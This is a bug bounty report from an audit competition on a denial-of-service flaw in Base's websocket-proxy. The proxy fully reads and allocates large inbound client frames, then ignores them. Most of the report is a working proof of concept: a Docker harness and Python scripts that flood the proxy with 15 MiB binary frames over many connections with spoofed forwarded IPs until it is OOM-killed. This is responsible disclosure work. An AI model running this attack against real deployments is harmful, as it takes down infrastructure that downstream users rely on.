# 76521 bc low ignored inbound websocket frames can oom the websocket proxy

Submitted on May 4th 2026 at 18:23:52 UTC by @adeolu for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76521
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

Affected code:

* [`crates/infra/websocket-proxy/src/registry.rs:134-179`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/infra/websocket-proxy/src/registry.rs#L134-L179)
* [`crates/infra/websocket-proxy/src/server.rs:226-273`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/infra/websocket-proxy/src/server.rs#L226-L273)
* [`bin/websocket-proxy/src/main.rs:270-278`](https://github.com/base/base/blob/v0.8.0-rc.28/bin/websocket-proxy/src/main.rs#L270-L278)
* [`f20_websocket_proxy_poc/run_finding1_inbound_frame_oom.sh`](broken://pages/639fc57eb2de5aeb2e039b88b2ccb8e6b825eb44)
* [`f20_websocket_proxy_poc/scripts/attack_inbound_frames.py`](broken://pages/0089487d4e88f80a6096363ce147949c3b7aa6da)
* [`f20_websocket_proxy_poc/scripts/raw_ws.py`](broken://pages/55f23c5b0c8f7f9d3f9e4c7b266d31b570e272d6)

## Summary

The websocket proxy is intended to be one-directional: it subscribes to upstream flashblocks and broadcasts them to downstream clients. However, every downstream client connection still spawns a reader task that continuously calls `ws_receiver.next()`.

The reader only handles `Pong`, `Close`, receive errors, and stream closure. Any other inbound frame, including `Text` and `Binary`, falls into `_ => {}` and is silently discarded after axum/tungstenite has already read, reassembled, validated, and allocated the message.

The exposure depends on how the proxy is configured. If no `--api-keys` are configured, the proxy enables the public `/ws` endpoint and any unauthenticated client can open a WebSocket and send inbound frames. If `--api-keys` are configured, the vulnerable path is reachable through `/ws/{api_key}` by any client with a valid API key. If `--public-access-enabled` is also set with API keys configured, the public `/ws` endpoint is enabled again. Enabling authentication does not remove the bug; it only changes the attacker prerequisite from "any unauthenticated client" to "any client with a valid API key."

The server's `WebSocketUpgrade` is used without lowering axum/tungstenite's message or frame limits. In tungstenite `0.28`, the defaults allow large messages, with a default max message size of 64 MiB and default max frame size of 16 MiB. The PoC uses 15 MiB binary frames, which stay below the default frame limit while still forcing large per-connection allocations inside the proxy.

The Docker PoC runs the stock `websocket-proxy` binary with a 256 MiB cgroup memory limit. It opens 32 downstream WebSocket clients and repeatedly sends 15 MiB binary frames to `/ws`. The proxy does not need to broadcast anything to these clients. It OOMs while reading and discarding attacker-controlled inbound frames.

This maps most directly to:

```
Medium
Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours
```

If the websocket proxy is deployed as shared Base infrastructure for flashblocks consumers, crashing it also causes a service outage for downstream clients of that proxy.

## Required Conditions

The issue shows when these configs and conditions line up:

* The websocket proxy is reachable by an attacker in one of its supported downstream modes:
  * no `--api-keys` configured, which enables unauthenticated public `/ws`;
  * `--api-keys` configured, which enables authenticated `/ws/{api_key}`;
  * `--api-keys` plus `--public-access-enabled`, which re-enables unauthenticated public `/ws`.
* The deployment does not have an outer reverse proxy or WAF enforcing a much lower WebSocket frame/message size before traffic reaches axum.
* The proxy uses the current `WebSocketUpgrade` path, which does not configure `max_message_size`, `max_frame_size`, or an inbound close-on-unexpected-data policy.
* The attacker can keep connections open long enough to send repeated large frames. The PoC disables client ping checks and uses the default one-directional behavior.
* Connection limits do not limit inbound bytes. The PoC raises the instance and per-IP connection limits so the test isolates the byte-processing bug rather than the limiter. In production, equivalent concurrency can come from configured higher limits, multiple source IPs, or the separately reported forwarded-IP spoofing issue.
* Docker memory is capped in the PoC with `--memory` and `--memory-swap` set to the same value, so swap does not hide the proxy memory failure.

## Vulnerability Detail

{% stepper %}
{% step %}

## Server routing exposes either public or authenticated downstream websocket endpoints

Source: [`server.rs:92-106`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/infra/websocket-proxy/src/server.rs#L92-L106)

```rust
if self.authentication.is_some() {
    info!("Authentication is enabled");
    router = router
        .route("/ws/{api_key}", any(authenticated_websocket_handler))
        .route("/ws/{api_key}/filter", any(authenticated_filter_websocket_handler));
} else {
    info!("Public endpoint is enabled");
    router = router.route("/ws", any(unauthenticated_websocket_handler));
}

if self.public_access_enabled && self.authentication.is_some() {
    info!("Public endpoint is enabled");
    router = router.route("/ws", any(unauthenticated_websocket_handler));
}
```

Therefore, the unauthenticated version of the attack applies to deployments with no configured API keys, or deployments that explicitly set `--public-access-enabled`. Authenticated deployments still expose the same vulnerable reader to any valid API-key client through `/ws/{api_key}`. Authentication gates who can reach the reader; it does not change how inbound `Text` or `Binary` frames are processed once the WebSocket is upgraded.
{% endstep %}

{% step %}

## Each client connection starts a reader even though client data is unused

Source: [`registry.rs:50-56`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/infra/websocket-proxy/src/registry.rs#L50-L56)

```rust
let filter = client.filter.clone();
let compressed = self.compressed;
let client_id = client.id();
let (mut ws_sender, ws_receiver) = client.websocket.split();

let (pong_error_tx, mut pong_error_rx) = tokio::sync::oneshot::channel();
let client_reader = self.start_reader(ws_receiver, client_id.clone(), pong_error_tx);
```

This creates a downstream WebSocket reader for every subscriber.
{% endstep %}

{% step %}

## The reader consumes all inbound frames

Source: [`registry.rs:149-179`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/infra/websocket-proxy/src/registry.rs#L149-L179)

```rust
msg = ws_receiver.next() => {
    match msg {
        Some(Ok(Message::Pong(_))) => {
            if ping_enabled {
                trace!(message = "received pong from client", client = client_id);
                last_pong = Instant::now();
            }
        }
        Some(Ok(Message::Close(_))) => {
            trace!(message = "received close from client", client = client_id);
            let _ = pong_error_tx.send(());
            return;
        }
        Some(Err(e)) => {
            trace!(
                message = "error receiving from client",
                client = client_id,
                error = e.to_string()
            );
            let _ = pong_error_tx.send(());
            return;
        }
        None => {
            trace!(message = "client connection closed", client = client_id);
            let _ = pong_error_tx.send(());
            return;
        }
        _ => {}
    }
}
```

The final `_ => {}` means client `Text`, `Binary`, and `Ping` frames are accepted and ignored. For large `Text` or `Binary` frames, the expensive work has already happened before this match arm is reached.
{% endstep %}

{% step %}

## The WebSocket upgrade does not lower frame or message limits

Source: [`server.rs:226-273`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/infra/websocket-proxy/src/server.rs#L226-L273)

```rust
fn websocket_handler(
    state: ServerState,
    ws: WebSocketUpgrade,
    addr: SocketAddr,
    headers: HeaderMap,
    filter: FilterType,
) -> Response {
    ...
    ws.on_failed_upgrade(...)
    .on_upgrade(async move |socket| {
        let client = ClientConnection::new(client_addr, ticket, socket, filter);
        state.registry.subscribe(client).await;
    })
}
```

There is no call to configure a smaller message limit, frame limit, or backpressure policy for inbound client frames.
{% endstep %}

{% step %}

## Connection limits do not account for inbound bytes or frame rate

The rate limiter only limits active connections. Once a connection is admitted, it can keep sending inbound frames and make the proxy allocate and parse them until the connection closes or the process is killed.

The PoC raises connection caps to avoid proving a different bug:

```bash
--instance-connection-limit 200
--per-ip-connection-limit 200
```

That does not modify the vulnerable code path. It only makes the Docker proof deterministic on one host.
{% endstep %}

{% step %}

## The PoC confirms Docker OOMKilled on stock code

The generated Docker victim is built from the repository's unmodified `websocket-proxy` binary. The attacker speaks raw WebSocket using Python's standard library and sends masked 15 MiB binary frames. Docker records:

```
Status: exited
OOMKilled: true
ExitCode: 137
```

{% endstep %}
{% endstepper %}

## Attack Path

1. The attacker connects to the proxy's downstream WebSocket endpoint. In no-API-keys mode this is public `/ws`; in authenticated mode it is `/ws/{api_key}` for a valid API key.
2. The connection is accepted by the global and per-IP connection limiter.
3. `Registry::subscribe` starts a reader task for that client.
4. The attacker sends large masked `Binary` or `Text` frames. The proxy does not need these frames for any feature.
5. Axum/tungstenite reads, reassembles, unmasks, validates, and allocates those frames.
6. `start_reader` matches the resulting `Message::Binary` or `Message::Text` through `_ => {}` and discards it.
7. The attacker repeats this across multiple long-lived connections.
8. Memory and CPU consumption rise independently of upstream flashblock volume.
9. Under a realistic container memory cap, the kernel kills the proxy process.

## Impact

The proven impact is external resource exhaustion of the websocket proxy. A client can make the proxy allocate and process large inbound WebSocket messages that are unused by the protocol.

The most direct contest category is:

```
Medium
Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours
```

If a fleet uses the same proxy configuration, the same attack can be run against each exposed instance. The PoC demonstrates full process death under a small but normal cgroup limit. It does not prove a total Base network shutdown, but it is a credible resource-exhaustion path for the public flashblocks proxy service.

## Proof of Concept

The PoC is a Docker harness that builds and runs the stock `websocket-proxy` binary from a fresh checkout, caps the victim container's memory, starts a mock upstream WebSocket server, and then launches raw downstream WebSocket clients that repeatedly send large ignored binary frames.

The victim process is the repository's real `websocket-proxy` binary. The helper containers only provide a mock upstream and attacker clients so the issue is reproducible on a clean machine.

These steps start from a freshly cloned repository.

{% stepper %}
{% step %}

## Step 0: clone and checkout the vulnerable version

```bash
git clone https://github.com/base/base.git
cd base
git checkout v0.8.0-rc.28
```

{% endstep %}

{% step %}

## Step 1: add the PoC helper files

The upstream repository will not already contain the PoC helper files. From the repository root, apply this patch to create the Dockerfiles, mock upstream, raw WebSocket helper, attacker, and runner:

```bash
git apply <<'PATCH'
diff --git a/f20_websocket_proxy_poc/docker/proxy.Dockerfile b/f20_websocket_proxy_poc/docker/proxy.Dockerfile
new file mode 100644
--- /dev/null
+++ b/f20_websocket_proxy_poc/docker/proxy.Dockerfile
@@ -0,0 +1,18 @@
+# syntax=docker/dockerfile:1.7
+ARG RUST_IMAGE=rust:1.93-slim
+FROM ${RUST_IMAGE} AS builder
+
+WORKDIR /src
+COPY . .
+RUN --mount=type=cache,target=/usr/local/cargo/git \
+    --mount=type=cache,target=/usr/local/cargo/registry \
+    --mount=type=cache,target=/src/target \
+    rm -f .cargo/config.toml && \
+    cargo build --release -p websocket-proxy-bin --bin websocket-proxy && \
+    cp target/release/websocket-proxy /tmp/websocket-proxy
+
+FROM ${RUST_IMAGE} AS runtime
+
+COPY --from=builder /tmp/websocket-proxy /usr/local/bin/websocket-proxy
+
+ENTRYPOINT ["/usr/local/bin/websocket-proxy"]
diff --git a/f20_websocket_proxy_poc/docker/harness.Dockerfile b/f20_websocket_proxy_poc/docker/harness.Dockerfile
new file mode 100644
--- /dev/null
+++ b/f20_websocket_proxy_poc/docker/harness.Dockerfile
@@ -0,0 +1,7 @@
+FROM python:3.13-slim
+
+WORKDIR /poc
+COPY scripts/*.py /poc/scripts/
+
+ENV PYTHONUNBUFFERED=1
+
diff --git a/f20_websocket_proxy_poc/scripts/raw_ws.py b/f20_websocket_proxy_poc/scripts/raw_ws.py
new file mode 100644
--- /dev/null
+++ b/f20_websocket_proxy_poc/scripts/raw_ws.py
@@ -0,0 +1,123 @@
+import asyncio
+import base64
+import hashlib
+import os
+import struct
+
+
+MAGIC = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
+
+
+def websocket_accept(key: str) -> str:
+    digest = hashlib.sha1((key + MAGIC).encode("ascii")).digest()
+    return base64.b64encode(digest).decode("ascii")
+
+
+def build_server_frame(opcode: int, payload: bytes) -> bytes:
+    first = 0x80 | opcode
+    length = len(payload)
+    if length < 126:
+        header = bytes([first, length])
+    elif length <= 0xFFFF:
+        header = bytes([first, 126]) + struct.pack("!H", length)
+    else:
+        header = bytes([first, 127]) + struct.pack("!Q", length)
+    return header + payload
+
+
+def build_masked_client_frame(opcode: int, payload_len: int, mask: bytes = b"\x37\xfa\x21\x3d") -> bytes:
+    first = 0x80 | opcode
+    if payload_len < 126:
+        header = bytes([first, 0x80 | payload_len])
+    elif payload_len <= 0xFFFF:
+        header = bytes([first, 0x80 | 126]) + struct.pack("!H", payload_len)
+    else:
+        header = bytes([first, 0x80 | 127]) + struct.pack("!Q", payload_len)
+
+    # The unmasked payload is all zero bytes, so the masked payload is just the
+    # four-byte masking key repeated. This avoids holding two large buffers.
+    masked_payload = (mask * ((payload_len // len(mask)) + 1))[:payload_len]
+    return header + mask + masked_payload
+
+
+async def read_exactly_or_none(reader: asyncio.StreamReader, length: int) -> bytes | None:
+    try:
+        return await reader.readexactly(length)
+    except asyncio.IncompleteReadError:
+        return None
+    except ConnectionError:
+        return None
+
+
+async def read_frame(reader: asyncio.StreamReader) -> tuple[int, bytes] | None:
+    header = await read_exactly_or_none(reader, 2)
+    if header is None:
+        return None
+
+    first, second = header
+    opcode = first & 0x0F
+    masked = (second & 0x80) != 0
+    length = second & 0x7F
+
+    if length == 126:
+        data = await read_exactly_or_none(reader, 2)
+        if data is None:
+            return None
+        length = struct.unpack("!H", data)[0]
+    elif length == 127:
+        data = await read_exactly_or_none(reader, 8)
+        if data is None:
+            return None
+        length = struct.unpack("!Q", data)[0]
+
+    mask = b""
+    if masked:
+        mask = await read_exactly_or_none(reader, 4)
+        if mask is None:
+            return None
+
+    payload = await read_exactly_or_none(reader, length)
+    if payload is None:
+        return None
+
+    if masked:
+        payload = bytes(byte ^ mask[index % 4] for index, byte in enumerate(payload))
+
+    return opcode, payload
+
+
+async def client_handshake(
+    host: str,
+    port: int,
+    path: str,
+    extra_headers: dict[str, str] | None = None,
+) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
+    reader, writer = await asyncio.open_connection(host, port)
+    key = base64.b64encode(os.urandom(16)).decode("ascii")
+
+    headers = [
+        f"GET {path} HTTP/1.1",
+        f"Host: {host}:{port}",
+        "Upgrade: websocket",
+        "Connection: Upgrade",
+        f"Sec-WebSocket-Key: {key}",
+        "Sec-WebSocket-Version: 13",
+    ]
+
+    if extra_headers:
+        for name, value in extra_headers.items():
+            headers.append(f"{name}: {value}")
+
+    request = "\r\n".join(headers).encode("ascii") + b"\r\n\r\n"
+    writer.write(request)
+    await writer.drain()
+
+    response = await reader.readuntil(b"\r\n\r\n")
+    status_line = response.split(b"\r\n", 1)[0]
+    if b" 101 " not in status_line:
+        writer.close()
+        await writer.wait_closed()
+        raise RuntimeError(status_line.decode("latin1", errors="replace"))
+
+    return reader, writer
+
diff --git a/f20_websocket_proxy_poc/scripts/mock_upstream.py b/f20_websocket_proxy_poc/scripts/mock_upstream.py
new file mode 100644
--- /dev/null
+++ b/f20_websocket_proxy_poc/scripts/mock_upstream.py
@@ -0,0 +1,145 @@
+import asyncio
+import json
+import os
+import time
+
+from raw_ws import build_server_frame, read_frame, websocket_accept
+
+
+OPCODE_TEXT = 0x1
+OPCODE_CLOSE = 0x8
+OPCODE_PING = 0x9
+OPCODE_PONG = 0xA
+
+
+def env_int(name: str, default: int) -> int:
+    return int(os.environ.get(name, str(default)))
+
+
+def make_flashblock_payload(target_bytes: int) -> bytes:
+    tx_hex_bytes = env_int("TX_HEX_BYTES", 4096)
+    tx_template = "0x" + ("0123456789abcde" * ((tx_hex_bytes // 15) + 1))[:tx_hex_bytes]
+
+    def flashblock_with(transactions: list[str]) -> dict:
+        return {
+            "payload_id": "0x0307de8ff1df8ed8",
+            "index": 0,
+            "base": {
+                "parent_hash": "0x" + "11" * 32,
+                "block_number": "0x1",
+            },
+            "diff": {
+                "transactions": transactions,
+                "withdrawals": [],
+            },
+            "metadata": {
+                "block_number": 26600873,
+                "receipts": None,
+                "new_account_balances": None,
+                "access_list": None,
+            },
+        }
+
+    empty_payload = json.dumps(flashblock_with([]), separators=(",", ":"))
+    encoded_tx_len = len(json.dumps(tx_template, separators=(",", ":"))) + 1
+    tx_count = max(1, ((target_bytes - len(empty_payload)) // encoded_tx_len) + 1)
+
+    transactions = [tx_template] * tx_count
+    payload = json.dumps(flashblock_with(transactions), separators=(",", ":"))
+
+    while len(payload.encode("utf-8")) < target_bytes:
+        transactions.append(tx_template)
+        payload = json.dumps(flashblock_with(transactions), separators=(",", ":"))
+
+    return payload.encode("utf-8")
+
+
+async def websocket_handshake(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> bool:
+    try:
+        request = await reader.readuntil(b"\r\n\r\n")
+    except asyncio.IncompleteReadError:
+        return False
+
+    headers = {}
+    for raw_line in request.decode("latin1", errors="replace").split("\r\n")[1:]:
+        if ":" in raw_line:
+            name, value = raw_line.split(":", 1)
+            headers[name.strip().lower()] = value.strip()
+
+    key = headers.get("sec-websocket-key")
+    if not key:
+        return False
+
+    response = (
+        "HTTP/1.1 101 Switching Protocols\r\n"
+        "Upgrade: websocket\r\n"
+        "Connection: Upgrade\r\n"
+        f"Sec-WebSocket-Accept: {websocket_accept(key)}\r\n"
+        "\r\n"
+    )
+    writer.write(response.encode("ascii"))
+    await writer.drain()
+    return True
+
+
+async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
+    peer = writer.get_extra_info("peername")
+    if not await websocket_handshake(reader, writer):
+        writer.close()
+        await writer.wait_closed()
+        return
+
+    mode = os.environ.get("MODE", "idle")
+    interval_ms = env_int("SEND_INTERVAL_MS", 50)
+    payload = make_flashblock_payload(env_int("PAYLOAD_BYTES", 2_000_000))
+    write_lock = asyncio.Lock()
+
+    print(f"upstream accepted {peer}, mode={mode}, payload_bytes={len(payload)}", flush=True)
+
+    async def send_loop() -> None:
+        frame = build_server_frame(OPCODE_TEXT, payload)
+        while True:
+            async with write_lock:
+                writer.write(frame)
+                await writer.drain()
+            await asyncio.sleep(interval_ms / 1000)
+
+    async def read_loop() -> None:
+        while True:
+            frame = await read_frame(reader)
+            if frame is None:
+                return
+            opcode, frame_payload = frame
+            if opcode == OPCODE_PING:
+                async with write_lock:
+                    writer.write(build_server_frame(OPCODE_PONG, frame_payload))
+                    await writer.drain()
+            elif opcode == OPCODE_CLOSE:
+                return
+
+    tasks = [asyncio.create_task(read_loop())]
+    if mode == "send_flashblocks":
+        tasks.append(asyncio.create_task(send_loop()))
+
+    done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+    for task in pending:
+        task.cancel()
+    for task in done:
+        task.result()
+
+    writer.close()
+    await writer.wait_closed()
+    print(f"upstream closed {peer} at {int(time.time())}", flush=True)
+
+
+async def main() -> None:
+    host = os.environ.get("HOST", "0.0.0.0")
+    port = env_int("PORT", 1111)
+    server = await asyncio.start_server(handle_client, host, port)
+    print(f"mock upstream listening on {host}:{port}", flush=True)
+    async with server:
+        await server.serve_forever()
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
diff --git a/f20_websocket_proxy_poc/scripts/attack_inbound_frames.py b/f20_websocket_proxy_poc/scripts/attack_inbound_frames.py
new file mode 100644
--- /dev/null
+++ b/f20_websocket_proxy_poc/scripts/attack_inbound_frames.py
@@ -0,0 +1,79 @@
+import asyncio
+import os
+import time
+
+from raw_ws import build_masked_client_frame, client_handshake
+
+
+OPCODE_BINARY = 0x2
+
+
+def env_int(name: str, default: int) -> int:
+    return int(os.environ.get(name, str(default)))
+
+
+async def attack_worker(index: int, frame: bytes, counters: dict[str, int]) -> None:
+    host = os.environ.get("TARGET_HOST", "127.0.0.1")
+    port = env_int("TARGET_PORT", 8545)
+    path = os.environ.get("TARGET_PATH", "/ws")
+    delay_ms = env_int("SEND_DELAY_MS", 0)
+
+    while True:
+        try:
+            _, writer = await client_handshake(
+                host,
+                port,
+                path,
+                {"X-Forwarded-For": f"10.99.{index // 255}.{index % 255}"},
+            )
+            counters["connections"] += 1
+
+            while True:
+                writer.write(frame)
+                await writer.drain()
+                counters["frames"] += 1
+                counters["bytes"] += len(frame)
+                if delay_ms:
+                    await asyncio.sleep(delay_ms / 1000)
+        except Exception as exc:
+            counters["errors"] += 1
+            print(f"inbound worker {index} reconnecting after {type(exc).__name__}: {exc}", flush=True)
+            await asyncio.sleep(0.1)
+
+
+async def progress(counters: dict[str, int]) -> None:
+    start = time.time()
+    while True:
+        await asyncio.sleep(5)
+        elapsed = max(time.time() - start, 1)
+        mib = counters["bytes"] / (1024 * 1024)
+        print(
+            "inbound attack progress: "
+            f"connections={counters['connections']} "
+            f"frames={counters['frames']} "
+            f"errors={counters['errors']} "
+            f"sent_mib={mib:.1f} "
+            f"mib_per_sec={mib / elapsed:.1f}",
+            flush=True,
+        )
+
+
+async def main() -> None:
+    connections = env_int("CONNECTIONS", 32)
+    frame_bytes = env_int("FRAME_BYTES", 15 * 1024 * 1024)
+    frame = build_masked_client_frame(OPCODE_BINARY, frame_bytes)
+    counters = {"connections": 0, "frames": 0, "bytes": 0, "errors": 0}
+
+    print(
+        f"starting inbound-frame attack connections={connections} frame_bytes={frame_bytes}",
+        flush=True,
+    )
+
+    tasks = [asyncio.create_task(attack_worker(index, frame, counters)) for index in range(connections)]
+    tasks.append(asyncio.create_task(progress(counters)))
+    await asyncio.gather(*tasks)
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
+
diff --git a/f20_websocket_proxy_poc/run_finding1_inbound_frame_oom.sh b/f20_websocket_proxy_poc/run_finding1_inbound_frame_oom.sh
new file mode 100755
--- /dev/null
+++ b/f20_websocket_proxy_poc/run_finding1_inbound_frame_oom.sh
@@ -0,0 +1,127 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
+ARTIFACT_DIR="${ARTIFACT_DIR:-$SCRIPT_DIR/artifacts/$(date +%Y%m%d-%H%M%S)-finding1-inbound-frame}"
+
+PROXY_IMAGE="${PROXY_IMAGE:-f20-websocket-proxy-victim:latest}"
+HARNESS_IMAGE="${HARNESS_IMAGE:-f20-websocket-proxy-harness:latest}"
+NETWORK_NAME="${NETWORK_NAME:-f20-websocket-proxy-poc}"
+UPSTREAM_NAME="${UPSTREAM_NAME:-f20-finding1-upstream}"
+PROXY_NAME="${PROXY_NAME:-f20-finding1-proxy}"
+ATTACKER_NAME="${ATTACKER_NAME:-f20-finding1-attacker}"
+
+MEMORY_LIMIT="${MEMORY_LIMIT:-256m}"
+TIMEOUT_SECONDS="${TIMEOUT_SECONDS:-240}"
+CONNECTIONS="${CONNECTIONS:-32}"
+FRAME_BYTES="${FRAME_BYTES:-15728640}"
+SEND_DELAY_MS="${SEND_DELAY_MS:-0}"
+SKIP_BUILD="${SKIP_BUILD:-0}"
+KEEP_CONTAINERS="${KEEP_CONTAINERS:-0}"
+
+mkdir -p "$ARTIFACT_DIR"
+
+cleanup_previous() {
+  docker rm -f "$ATTACKER_NAME" "$PROXY_NAME" "$UPSTREAM_NAME" >/dev/null 2>&1 || true
+  docker network rm "$NETWORK_NAME" >/dev/null 2>&1 || true
+}
+
+build_images() {
+  if [[ "$SKIP_BUILD" == "1" ]]; then
+    return
+  fi
+  docker build -f "$SCRIPT_DIR/docker/proxy.Dockerfile" -t "$PROXY_IMAGE" "$REPO_ROOT"
+  docker build -f "$SCRIPT_DIR/docker/harness.Dockerfile" -t "$HARNESS_IMAGE" "$SCRIPT_DIR"
+}
+
+snapshot_victim() {
+  docker inspect "$PROXY_NAME" >"$ARTIFACT_DIR/proxy.inspect.json" 2>&1 || true
+  docker logs "$PROXY_NAME" >"$ARTIFACT_DIR/proxy.log" 2>&1 || true
+  docker logs "$ATTACKER_NAME" >"$ARTIFACT_DIR/attacker.log" 2>&1 || true
+  docker logs "$UPSTREAM_NAME" >"$ARTIFACT_DIR/upstream.log" 2>&1 || true
+}
+
+cleanup() {
+  snapshot_victim
+  if [[ "$KEEP_CONTAINERS" != "1" ]]; then
+    docker rm -f "$ATTACKER_NAME" "$PROXY_NAME" "$UPSTREAM_NAME" >/dev/null 2>&1 || true
+    docker network rm "$NETWORK_NAME" >/dev/null 2>&1 || true
+  fi
+}
+
+trap cleanup EXIT
+
+cleanup_previous
+build_images
+
+docker network create "$NETWORK_NAME" >/dev/null
+
+docker run -d \
+  --name "$UPSTREAM_NAME" \
+  --network "$NETWORK_NAME" \
+  -e MODE=idle \
+  "$HARNESS_IMAGE" \
+  python /poc/scripts/mock_upstream.py >/dev/null
+
+docker run -d \
+  --name "$PROXY_NAME" \
+  --network "$NETWORK_NAME" \
+  --memory "$MEMORY_LIMIT" \
+  --memory-swap "$MEMORY_LIMIT" \
+  -e METRICS=false \
+  "$PROXY_IMAGE" \
+  --listen-addr 0.0.0.0:8545 \
+  --upstream-ws ws://"$UPSTREAM_NAME":1111 \
+  --message-buffer-size 20 \
+  --instance-connection-limit 200 \
+  --per-ip-connection-limit 200 \
+  --subscriber-pong-timeout-ms 10000 >/dev/null
+
+sleep 3
+
+docker run -d \
+  --name "$ATTACKER_NAME" \
+  --network "$NETWORK_NAME" \
+  -e TARGET_HOST="$PROXY_NAME" \
+  -e TARGET_PORT=8545 \
+  -e TARGET_PATH=/ws \
+  -e CONNECTIONS="$CONNECTIONS" \
+  -e FRAME_BYTES="$FRAME_BYTES" \
+  -e SEND_DELAY_MS="$SEND_DELAY_MS" \
+  "$HARNESS_IMAGE" \
+  python /poc/scripts/attack_inbound_frames.py >/dev/null
+
+echo "finding1 attack started: memory_limit=$MEMORY_LIMIT connections=$CONNECTIONS frame_bytes=$FRAME_BYTES"
+echo "artifacts: $ARTIFACT_DIR"
+
+deadline=$((SECONDS + TIMEOUT_SECONDS))
+while (( SECONDS < deadline )); do
+  state="$(docker inspect -f '{{.State.Status}} {{.State.OOMKilled}} {{.State.ExitCode}}' "$PROXY_NAME" 2>/dev/null || true)"
+  stats="$(docker stats --no-stream --format 'cpu={{.CPUPerc}} mem={{.MemUsage}}' "$PROXY_NAME" 2>/dev/null || true)"
+  printf '%s state=%s %s\n' "$(date -u +%FT%TZ)" "$state" "$stats" | tee -a "$ARTIFACT_DIR/stats.log"
+
+  status="${state%% *}"
+  oom="$(printf '%s' "$state" | awk '{print $2}')"
+  exit_code="$(printf '%s' "$state" | awk '{print $3}')"
+
+  if [[ "$status" == "exited" || "$status" == "dead" ]]; then
+    snapshot_victim
+    if [[ "$oom" == "true" ]]; then
+      echo "SUCCESS: proxy exited under the inbound-frame attack: state=$state"
+      exit 0
+    fi
+    if [[ "$exit_code" == "137" ]]; then
+      echo "proxy was SIGKILLed but Docker did not mark it OOMKilled: state=$state"
+      exit 1
+    fi
+    echo "proxy exited before Docker marked OOM: state=$state"
+    exit 1
+  fi
+
+  sleep 2
+done
+
+snapshot_victim
+echo "TIMEOUT: proxy did not exit within ${TIMEOUT_SECONDS}s. Increase CONNECTIONS or lower MEMORY_LIMIT."
+exit 2
PATCH
```

The runner created by the patch is:

```
f20_websocket_proxy_poc/run_finding1_inbound_frame_oom.sh
```

{% endstep %}

{% step %}

## Step 2: sanity-check local prerequisites

Make sure Docker is running and the helper files parse:

```bash
docker version
docker ps
bash -n f20_websocket_proxy_poc/run_finding1_inbound_frame_oom.sh
python3 -c "import pathlib; files=['f20_websocket_proxy_poc/scripts/raw_ws.py','f20_websocket_proxy_poc/scripts/mock_upstream.py','f20_websocket_proxy_poc/scripts/attack_inbound_frames.py']; [compile(pathlib.Path(p).read_text(), p, 'exec') for p in files]"
```

Expected: `docker version` and `docker ps` succeed, `bash -n` prints nothing, and the Python compile command exits with status `0`.
{% endstep %}

{% step %}

## Step 3: run the Docker PoC

Run the harness from the repository root:

```bash
bash f20_websocket_proxy_poc/run_finding1_inbound_frame_oom.sh
```

Default parameters:

```
MEMORY_LIMIT=256m
CONNECTIONS=32
FRAME_BYTES=15728640
SEND_DELAY_MS=0
TIMEOUT_SECONDS=240
```

The runner does the following:

1. Builds `f20-websocket-proxy-victim:latest` from `bin/websocket-proxy` with the stock source tree.
2. Builds `f20-websocket-proxy-harness:latest` with only Python stdlib helper scripts.
3. Starts an idle mock upstream WebSocket server so the proxy initializes normally.
4. Starts the stock proxy with `--memory 256m` and `--memory-swap 256m` so swap does not hide the OOM.
5. Opens 32 downstream `/ws` clients and repeatedly sends valid masked 15 MiB binary frames.
6. Polls Docker until the proxy exits, then saves logs and `docker inspect` output.

The attack frame is intentionally below tungstenite's default 16 MiB frame limit. Raising `FRAME_BYTES` above that can test different failure behavior, but is not needed to prove this issue.

Useful tuning knobs:

```bash
MEMORY_LIMIT=512m CONNECTIONS=64 FRAME_BYTES=15728640 \
  bash f20_websocket_proxy_poc/run_finding1_inbound_frame_oom.sh
```

{% endstep %}

{% step %}

## Step 4: expected output

A successful run prints output like:

```
finding1 attack started: memory_limit=256m connections=32 frame_bytes=15728640
artifacts: f20_websocket_proxy_poc/artifacts/<timestamp>-finding1-inbound-frame
2026-05-03T20:31:59Z state=running false 0 cpu=... mem=...
2026-05-03T20:32:02Z state=exited true 137 cpu=... mem=...
SUCCESS: proxy exited under the inbound-frame attack: state=exited true 137
```

The important fields are:

```
state=exited true 137
```

That means Docker recorded `Status=exited`, `OOMKilled=true`, and `ExitCode=137` for the victim proxy container.
{% endstep %}

{% step %}

## Step 5: inspect the saved evidence

The runner writes artifacts under:

```
f20_websocket_proxy_poc/artifacts/<timestamp>-finding1-inbound-frame/
```

Confirm the Docker OOM state:

```bash
grep -E '"Status"|"OOMKilled"|"ExitCode"' \
  f20_websocket_proxy_poc/artifacts/*-finding1-inbound-frame/proxy.inspect.json
```

Expected evidence:

```
"Status": "exited"
"OOMKilled": true
"ExitCode": 137
```

Check the attacker log if desired:

```bash
tail -n 40 f20_websocket_proxy_poc/artifacts/*-finding1-inbound-frame/attacker.log
```

It should show the raw WebSocket clients repeatedly reconnecting or progressing as the victim dies.
{% endstep %}

{% step %}

## Step 6: what is mocked

The victim is not mocked. The Docker image builds and runs the stock `websocket-proxy` binary from the checked-out repository.

The mocked pieces are only external test scaffolding:

* `mock_upstream.py` is an idle upstream WebSocket server so the proxy can start normally. The inbound-frame bug does not require any upstream flashblock broadcast.
